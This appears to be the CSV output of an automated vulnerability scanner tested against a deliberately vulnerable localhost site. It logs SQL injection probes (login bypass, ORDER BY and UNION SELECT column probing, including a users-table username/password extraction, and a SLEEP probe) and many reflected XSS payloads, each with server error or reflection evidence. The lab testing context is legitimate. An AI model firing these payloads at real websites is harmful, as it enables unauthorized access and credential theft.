target,type,detail
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""admin' --"", ""score"": 0.0}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""admin'#"", ""pattern"": ""you have an error in your sql syntax"", ""evidence_snippet"": ""on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that ""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""admin'#"", ""pattern"": ""sqlstate"", ""evidence_snippet"": ""&lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""admin'#"", ""score"": 0.0}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""admin'/*"", ""pattern"": ""you have an error in your sql syntax"", ""evidence_snippet"": ""on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that ""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""admin'/*"", ""pattern"": ""sqlstate"", ""evidence_snippet"": ""&lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_length_diff"", ""payload"": ""admin'/*"", ""len"": 538, ""baseline"": 329}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""admin'/*"", ""score"": 0.0}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""1' ORDER BY 1--"", ""pattern"": ""you have an error in your sql syntax"", ""evidence_snippet"": ""on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that ""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""1' ORDER BY 1--"", ""pattern"": ""sqlstate"", ""evidence_snippet"": ""&lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_length_diff"", ""payload"": ""1' ORDER BY 1--"", ""len"": 555, ""baseline"": 329}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""1' ORDER BY 1--"", ""score"": 0.0}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""1' ORDER BY 2--"", ""pattern"": ""you have an error in your sql syntax"", ""evidence_snippet"": ""on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that ""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""1' ORDER BY 2--"", ""pattern"": ""sqlstate"", ""evidence_snippet"": ""&lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_length_diff"", ""payload"": ""1' ORDER BY 2--"", ""len"": 555, ""baseline"": 329}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""1' ORDER BY 2--"", ""score"": 0.0}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""1' ORDER BY 3--"", ""pattern"": ""you have an error in your sql syntax"", ""evidence_snippet"": ""on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that ""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""1' ORDER BY 3--"", ""pattern"": ""sqlstate"", ""evidence_snippet"": ""&lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_length_diff"", ""payload"": ""1' ORDER BY 3--"", ""len"": 555, ""baseline"": 329}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""1' ORDER BY 3--"", ""score"": 0.0}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""-1' UNION SELECT 1,2,3--"", ""pattern"": ""you have an error in your sql syntax"", ""evidence_snippet"": ""on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that ""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""-1' UNION SELECT 1,2,3--"", ""pattern"": ""sqlstate"", ""evidence_snippet"": ""&lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_length_diff"", ""payload"": ""-1' UNION SELECT 1,2,3--"", ""len"": 572, ""baseline"": 329}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""-1' UNION SELECT 1,2,3--"", ""score"": 0.0}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""' UNION SELECT NULL--"", ""pattern"": ""you have an error in your sql syntax"", ""evidence_snippet"": ""on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that ""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""' UNION SELECT NULL--"", ""pattern"": ""sqlstate"", ""evidence_snippet"": ""&lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_length_diff"", ""payload"": ""' UNION SELECT NULL--"", ""len"": 568, ""baseline"": 329}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""' UNION SELECT NULL--"", ""score"": 0.0}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""' UNION SELECT username, password FROM users--"", ""pattern"": ""you have an error in your sql syntax"", ""evidence_snippet"": ""on: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that ""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""' UNION SELECT username, password FROM users--"", ""pattern"": ""sqlstate"", ""evidence_snippet"": ""&lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an e""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_length_diff"", ""payload"": ""' UNION SELECT username, password FROM users--"", ""len"": 602, ""baseline"": 329}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""' UNION SELECT username, password FROM users--"", ""score"": 0.0}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""' AND SLEEP(5)--"", ""pattern"": ""sqlstate"", ""evidence_snippet"": ""&lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[21S01]: Insert value list does not match column list: 1136 C""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""' AND SLEEP(5)--"", ""score"": 0.0}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_error"", ""payload"": ""1' OR 'a'='a"", ""pattern"": ""sqlstate"", ""evidence_snippet"": ""&lt;br /&gt; &lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught PDOException: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry""}"
http://localhost/testwebsite/vulnauth/login.php,sqli,"{""url"": ""http://localhost/testwebsite/vulnauth/register.php"", ""type"": ""post_sql_dom_diff"", ""payload"": ""1' OR 'a'='a"", ""score"": 0.0}"
http://localhost/testwebsite/vulnauth/login.php,xss,"{""url"": ""http://localhost/testwebsite/vulnauth/welcome.php?x=\""><script>alert(1)</script>"", ""param"": ""x"", ""payload"": ""\""><script>alert(1)</script>"", ""type"": ""reflected_xss_auto"", ""evidence_snippet"": ""&#x27;&gt;Register&lt;/a&gt;&lt;hr&gt;&lt;h2&gt;Welcome, Guest!&lt;/h2&gt;&lt;p&gt;Auto XSS Test: &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/p&gt;&lt;h3&gt;Stored Usernames:&lt;/h3&gt;&lt;ul""}"
http://localhost/testwebsite/vulnauth/login.php,xss,"{""url"": ""http://localhost/testwebsite/vulnauth/welcome.php?x=\""><img src=x onerror=alert(1)>"", ""param"": ""x"", ""payload"": ""\""><img src=x onerror=alert(1)>"", ""type"": ""reflected_xss_auto"", ""evidence_snippet"": ""&#x27;&gt;Register&lt;/a&gt;&lt;hr&gt;&lt;h2&gt;Welcome, Guest!&lt;/h2&gt;&lt;p&gt;Auto XSS Test: &quot;&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/p&gt;&lt;h3&gt;Stored Usernames:&lt;/h3&gt;""}"
http://localhost/testwebsite/vulnauth/login.php,xss,"{""url"": ""http://localhost/testwebsite/vulnauth/welcome.php?x=\""><svg/onload=alert(1)>"", ""param"": ""x"", ""payload"": ""\""><svg/onload=alert(1)>"", ""type"": ""reflected_xss_auto"", ""evidence_snippet"": ""&#x27;&gt;Register&lt;/a&gt;&lt;hr&gt;&lt;h2&gt;Welcome, Guest!&lt;/h2&gt;&lt;p&gt;Auto XSS Test: &quot;&gt;&lt;svg/onload=alert(1)&gt;&lt;/p&gt;&lt;h3&gt;Stored Usernames:&lt;/h3&gt;&lt;ul&gt;&lt;li""}"
http://localhost/testwebsite/vulnauth/login.php,xss,"{""url"": ""http://localhost/testwebsite/vulnauth/welcome.php?x=\""><iframe/src=javascript:alert(1)>"", ""param"": ""x"", ""payload"": ""\""><iframe/src=javascript:alert(1)>"", ""type"": ""reflected_xss_auto"", ""evidence_snippet"": ""&#x27;&gt;Register&lt;/a&gt;&lt;hr&gt;&lt;h2&gt;Welcome, Guest!&lt;/h2&gt;&lt;p&gt;Auto XSS Test: &quot;&gt;&lt;iframe/src=javascript:alert(1)&gt;&lt;/p&gt;&lt;h3&gt;Stored Usernames:&lt;""}"
http://localhost/testwebsite/vulnauth/login.php,xss,"{""url"": ""http://localhost/testwebsite/vulnauth/welcome.php?x=\""><body onload=alert(1)>"", ""param"": ""x"", ""payload"": ""\""><body onload=alert(1)>"", ""type"": ""reflected_xss_auto"", ""evidence_snippet"": ""&#x27;&gt;Register&lt;/a&gt;&lt;hr&gt;&lt;h2&gt;Welcome, Guest!&lt;/h2&gt;&lt;p&gt;Auto XSS Test: &quot;&gt;&lt;body onload=alert(1)&gt;&lt;/p&gt;&lt;h3&gt;Stored Usernames:&lt;/h3&gt;&lt;ul&gt;&lt;l""}"
http://localhost/testwebsite/vulnauth/login.php,xss,"{""url"": ""http://localhost/testwebsite/vulnauth/welcome.php?x=\""><script>confirm(1)</script>"", ""param"": ""x"", ""payload"": ""\""><script>confirm(1)</script>"", ""type"": ""reflected_xss_auto"", ""evidence_snippet"": ""&#x27;&gt;Register&lt;/a&gt;&lt;hr&gt;&lt;h2&gt;Welcome, Guest!&lt;/h2&gt;&lt;p&gt;Auto XSS Test: &quot;&gt;&lt;script&gt;confirm(1)&lt;/script&gt;&lt;/p&gt;&lt;h3&gt;Stored Usernames:&lt;/h3&gt;&lt;""}"
http://localhost/testwebsite/vulnauth/login.php,xss,"{""url"": ""http://localhost/testwebsite/vulnauth/welcome.php?x=\""><script>prompt(1)</script>"", ""param"": ""x"", ""payload"": ""\""><script>prompt(1)</script>"", ""type"": ""reflected_xss_auto"", ""evidence_snippet"": ""&#x27;&gt;Register&lt;/a&gt;&lt;hr&gt;&lt;h2&gt;Welcome, Guest!&lt;/h2&gt;&lt;p&gt;Auto XSS Test: &quot;&gt;&lt;script&gt;prompt(1)&lt;/script&gt;&lt;/p&gt;&lt;h3&gt;Stored Usernames:&lt;/h3&gt;&lt;u""}"
http://localhost/testwebsite/vulnauth/login.php,xss,"{""url"": ""http://localhost/testwebsite/vulnauth/welcome.php?x=\""><scr<script>ipt>alert(1)</scr<script>ipt>"", ""param"": ""x"", ""payload"": ""\""><scr<script>ipt>alert(1)</scr<script>ipt>"", ""type"": ""reflected_xss_auto"", ""evidence_snippet"": ""&#x27;&gt;Register&lt;/a&gt;&lt;hr&gt;&lt;h2&gt;Welcome, Guest!&lt;/h2&gt;&lt;p&gt;Auto XSS Test: &quot;&gt;&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;ipt&gt;&lt;/p&gt;&lt;h3&gt;Stored Us""}"
http://localhost/testwebsite/vulnauth/login.php,xss,"{""url"": ""http://localhost/testwebsite/vulnauth/welcome.php?x=\""><img src=x onerror=\""this.src='x';alert(1)\"">"", ""param"": ""x"", ""payload"": ""\""><img src=x onerror=\""this.src='x';alert(1)\"">"", ""type"": ""reflected_xss_auto"", ""evidence_snippet"": ""&#x27;&gt;Register&lt;/a&gt;&lt;hr&gt;&lt;h2&gt;Welcome, Guest!&lt;/h2&gt;&lt;p&gt;Auto XSS Test: &quot;&gt;&lt;img src=x onerror=&quot;this.src=&#x27;x&#x27;;alert(1)&quot;&gt;&lt;/p&gt;&lt;h3&gt;Stored ""}"
http://localhost/testwebsite/vulnauth/login.php,xss,"{""url"": ""http://localhost/testwebsite/vulnauth/welcome.php?x=<script>alert(document.domain)</script>"", ""param"": ""x"", ""payload"": ""<script>alert(document.domain)</script>"", ""type"": ""reflected_xss_auto"", ""evidence_snippet"": ""&#x27;&gt;Register&lt;/a&gt;&lt;hr&gt;&lt;h2&gt;Welcome, Guest!&lt;/h2&gt;&lt;p&gt;Auto XSS Test: &lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;/p&gt;&lt;h3&gt;Stored Userna""}"
http://localhost/testwebsite/vulnauth/login.php,xss,"{""url"": ""http://localhost/testwebsite/vulnauth/welcome.php?x=\""><svg><script>alert(1)</script>"", ""param"": ""x"", ""payload"": ""\""><svg><script>alert(1)</script>"", ""type"": ""reflected_xss_auto"", ""evidence_snippet"": ""&#x27;&gt;Register&lt;/a&gt;&lt;hr&gt;&lt;h2&gt;Welcome, Guest!&lt;/h2&gt;&lt;p&gt;Auto XSS Test: &quot;&gt;&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/p&gt;&lt;h3&gt;Stored Usernames:&lt;/h""}"
http://localhost/testwebsite/vulnauth/login.php,xss,"{""url"": ""http://localhost/testwebsite/vulnauth/welcome.php?x=\""><details/open ontoggle=alert(1)>"", ""param"": ""x"", ""payload"": ""\""><details/open ontoggle=alert(1)>"", ""type"": ""reflected_xss_auto"", ""evidence_snippet"": ""&#x27;&gt;Register&lt;/a&gt;&lt;hr&gt;&lt;h2&gt;Welcome, Guest!&lt;/h2&gt;&lt;p&gt;Auto XSS Test: &quot;&gt;&lt;details/open ontoggle=alert(1)&gt;&lt;/p&gt;&lt;h3&gt;Stored Usernames:&lt;""}"
http://localhost/testwebsite/vulnauth/login.php,xss,"{""url"": ""http://localhost/testwebsite/vulnauth/welcome.php?x=\""><a href=\""javascript:alert(1)\"">click</a>"", ""param"": ""x"", ""payload"": ""\""><a href=\""javascript:alert(1)\"">click</a>"", ""type"": ""reflected_xss_auto"", ""evidence_snippet"": ""&#x27;&gt;Register&lt;/a&gt;&lt;hr&gt;&lt;h2&gt;Welcome, Guest!&lt;/h2&gt;&lt;p&gt;Auto XSS Test: &quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;click&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;Stored User""}"
http://localhost/testwebsite/vulnauth/login.php,xss,"{""url"": ""http://localhost/testwebsite/vulnauth/welcome.php?x=</script><script>alert(1)</script>"", ""param"": ""x"", ""payload"": ""</script><script>alert(1)</script>"", ""type"": ""reflected_xss_auto"", ""evidence_snippet"": ""&#x27;&gt;Register&lt;/a&gt;&lt;hr&gt;&lt;h2&gt;Welcome, Guest!&lt;/h2&gt;&lt;p&gt;Auto XSS Test: &lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/p&gt;&lt;h3&gt;Stored Usernames:&lt;""}"
http://localhost/testwebsite/vulnauth/login.php,xss,"{""url"": ""http://localhost/testwebsite/vulnauth/welcome.php?x=\""><video src onerror=alert(1)>"", ""param"": ""x"", ""payload"": ""\""><video src onerror=alert(1)>"", ""type"": ""reflected_xss_auto"", ""evidence_snippet"": ""&#x27;&gt;Register&lt;/a&gt;&lt;hr&gt;&lt;h2&gt;Welcome, Guest!&lt;/h2&gt;&lt;p&gt;Auto XSS Test: &quot;&gt;&lt;video src onerror=alert(1)&gt;&lt;/p&gt;&lt;h3&gt;Stored Usernames:&lt;/h3&gt;""}"
http://localhost/testwebsite/vulnauth/login.php,xss,"{""url"": ""http://localhost/testwebsite/vulnauth/welcome.php?x=\""><audio src onerror=alert(1)>"", ""param"": ""x"", ""payload"": ""\""><audio src onerror=alert(1)>"", ""type"": ""reflected_xss_auto"", ""evidence_snippet"": ""&#x27;&gt;Register&lt;/a&gt;&lt;hr&gt;&lt;h2&gt;Welcome, Guest!&lt;/h2&gt;&lt;p&gt;Auto XSS Test: &quot;&gt;&lt;audio src onerror=alert(1)&gt;&lt;/p&gt;&lt;h3&gt;Stored Usernames:&lt;/h3&gt;""}"
http://localhost/testwebsite/vulnauth/login.php,xss,"{""url"": ""http://localhost/testwebsite/vulnauth/welcome.php?x=\""><marquee onstart=alert(1)>"", ""param"": ""x"", ""payload"": ""\""><marquee onstart=alert(1)>"", ""type"": ""reflected_xss_auto"", ""evidence_snippet"": ""&#x27;&gt;Register&lt;/a&gt;&lt;hr&gt;&lt;h2&gt;Welcome, Guest!&lt;/h2&gt;&lt;p&gt;Auto XSS Test: &quot;&gt;&lt;marquee onstart=alert(1)&gt;&lt;/p&gt;&lt;h3&gt;Stored Usernames:&lt;/h3&gt;&lt;u""}"
http://localhost/testwebsite/vulnauth/login.php,xss,"{""url"": ""http://localhost/testwebsite/vulnauth/welcome.php?x=\""><math><mtext><mglyph onload=alert(1)>"", ""param"": ""x"", ""payload"": ""\""><math><mtext><mglyph onload=alert(1)>"", ""type"": ""reflected_xss_auto"", ""evidence_snippet"": ""&#x27;&gt;Register&lt;/a&gt;&lt;hr&gt;&lt;h2&gt;Welcome, Guest!&lt;/h2&gt;&lt;p&gt;Auto XSS Test: &quot;&gt;&lt;math&gt;&lt;mtext&gt;&lt;mglyph onload=alert(1)&gt;&lt;/p&gt;&lt;h3&gt;Stored Userna""}"
